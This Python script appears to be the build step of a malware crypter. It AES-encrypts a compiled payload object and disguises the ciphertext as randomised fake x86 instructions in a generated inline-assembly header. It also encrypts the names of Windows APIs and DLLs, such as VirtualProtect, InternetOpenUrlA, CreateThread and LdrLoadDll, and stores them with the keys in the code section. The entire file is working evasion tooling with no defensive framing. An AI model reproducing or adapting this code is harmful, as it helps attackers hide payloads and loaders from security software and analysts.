from Crypto.Cipher import AES
from typing import List
from cryptstring import ce, se, be
import secrets
import random

def enc_obj(MasterKeyPayload, path: str):
    with open(path, "rb") as f:
        data = f.read()
    data = data[0x104:]
    while len(data)%16 != 0:
        data += b'\x00'
    cipher = AES.new(MasterKeyPayload, AES.MODE_ECB)
    ciphertext = cipher.encrypt(data)
    strings = []
    for i in range(len(ciphertext)//4):
        sr = asm_enc(ciphertext[i * 4: i * 4 + 4])
        strings += sr
    asm_len = 7 * len(strings)//3
    oal = asm_len
    asm_len = f"{asm_len:4x}".replace(" ", "0")
    # asm_len = rotate_string(asm_len)
    with open("macro_enc.h", "w") as f:
        f.write("/*\nFILE GENERATED AUTOMATICALLY VIA ENCRYPTER.py\nMANUAL EDITS WILL NOT AFFECT THE COMPILED FILE\n*/\n")
        f.write(f"\n#define payload_enc_asm  asm volatile(\ "[:-1]+"\n")
        f.write(fr'".long 0x00fc8348\n\t"\ '[:-1] +"\n")
        f.write(fr'".word 0x850f\n\t"\ '[:-1] +"\n")
        f.write(fr'".word 0x{asm_len}\n\t"\ '[:-1] +"\n")
        f.write(fr'".word 0x0000\n\t"\ '[:-1] +"\n")
        for s in strings:
            f.write(s)
            f.write("\n")
        f.write(");\n")
        f.write(f"#define PAYLOAD_LEN {oal//7 * 4}\n")

    # with open("payload_enc.c", "w") as f:
    #     f.write("unsigned char payload_enc_bytes[] ="+str([hex(byte) for byte in bytearray(ciphertext)])
    #             .replace("'", "").replace("[", "{").replace("]", "}")+";")
    return



def enc_strings(chars, shorts, chars_data, shorts_data, MasterKeyStrings, MasterKeyPayload: str) -> None:
    cipher = AES.new(MasterKeyStrings, AES.MODE_ECB)
    with open("dynamic_strings.c", "w") as f:
        f.write("/*\nFILE GENERATED AUTOMATICALLY VIA ENCRYPTER.py\nMANUAL EDITS WILL NOT AFFECT THE COMPILED FILE\n*/\n")
        for c, cd in zip(chars, chars_data):
            _ = ce(cd, cipher)
            f.write(f'unsigned char __attribute__((section(".text"))) _{c}[{len(_)}] = {{{str(_)[1:-1]}}};\n\n')
        for s, sd in zip(shorts, shorts_data):
            _ = se(sd, cipher)
            f.write(f'unsigned char __attribute__((section(".text"))) _{s}[{len(_)}] = {{{str(_)[1:-1]}}};\n\n')
        f.write(f'unsigned char __attribute__((section(".text"))) MasterKeyStrings[16] = {{{str(list(map(int, MasterKeyStrings)))[1:-1]}}};\n\n')
        MasterKeyPayload = be(MasterKeyPayload, cipher)
        f.write(f'unsigned char __attribute__((section(".text"))) _MasterKeyPayload[16] = {{{str(list(map(int, MasterKeyPayload)))[1:-1]}}};\n\n')


# 0:  48 35 04 03 02 01       xor    rax,0x1020304

# 0:  48 81 c3 04 03 02 01    add    rbx,0x1020304
# 7:  48 81 c1 04 03 02 01    add    rcx,0x1020304
# e:  48 81 c2 04 03 02 01    add    rdx,0x1020304
# 15: 48 81 c6 04 03 02 01    add    rsi,0x1020304
# 1c: 48 81 c7 04 03 02 01    add    rdi,0x1020304

# 0:  48 81 f3 04 03 02 01    xor    rbx,0x1020304
# 7:  48 81 f1 04 03 02 01    xor    rcx,0x1020304
# e:  48 81 f2 04 03 02 01    xor    rdx,0x1020304
# 15: 48 81 f6 04 03 02 01    xor    rsi,0x1020304
# 1c: 48 81 f7 04 03 02 01    xor    rdi,0x1020304
def asm_enc(data):
    allowed_1 = list("0123cdef")
    allowed_2 = list(range(0, 16))
    banned = ["0d", "2d", "2c", "15", "3c", "1d", "24", "25", "35", "3d", "0c", "04",
              "34", "14", "05", '1c']
    s1 = rf'".byte 0x48\n\t"\ '[:-1]
    while 1:
        addit = random.choice(allowed_1)+hex(random.choice(allowed_2))[2:]
        if addit in banned:
            continue
        # ref = f"48 81 {addit} 04 03 02 01"
        break
    # print(ref)
    s2 = rf'".word 0x{addit}81\n\t"\ '[:-1]
    pdata = list(map(lambda x: f"{x:2x}".replace(" ", "0"), data))
    # rotate_string = lambda s: s[-len(s)//2:] + s[:len(s)//2]
    pdata = list(reversed(pdata))
    pdata = "".join(pdata)

    s3 = rf'".long 0x{pdata}\n\t"\ '[:-1]
    return [s1,s2,s3]




if __name__ == "__main__":
    MasterKeyPayload = secrets.token_bytes(16)
    MasterKeyStrings = secrets.token_bytes(16)
    enc_obj(MasterKeyPayload, "./payload.o")
    chars = [  "cMessageBoxW",  "cVirtualProtect",  "cCreateFileW",
               "cWriteFile",  "cCloseHandle",  "cGetSystemTime",
               "cInternetOpenW",  "cInternetOpenUrlA",  "cInternetReadFile",
               "cInternetCloseHandle",  "cGetLastError",  "cCreateDisktopW",
               "cSetThreadDesktop",  "cCreateThread",  "cCloseDesktop",
               "cExitProcess",  "cRtlExitUserProcess",  "cLdrLoadDll",
               "cRtlInitUnicodeString"]
    chars_data = [
  "MessageBoxW",
  "VirtualProtect",
  "CreateFileW",
  "WriteFile",
  "CloseHandle",
  "GetSystemTime",
  "InternetOpenW",
  "InternetOpenUrlA",
  "InternetReadFile",
  "InternetCloseHandle",
  "GetLastError",
  "CreateDesktopW",
  "SetThreadDesktop",
  "CreateThread",
  "CloseDesktop",
  "ExitProcess",
  "RtlExitUserProcess",
  "LdrLoadDll",
  "RtlInitUnicodeString"
]
    shorts = [  "sKernelbase",  "sWininet",  "sUser32",  "sNtdll",  "sntdll_full_path"]
    shorts_data = [
  "kernelbase.dll",
  "wininet.dll",
  "user32.dll",
  "ntdll.dll",
  "C:\\Windows\\SYSTEM32\\ntdll.dll"
]
    enc_strings(chars, shorts,chars_data, shorts_data,MasterKeyStrings, MasterKeyPayload)
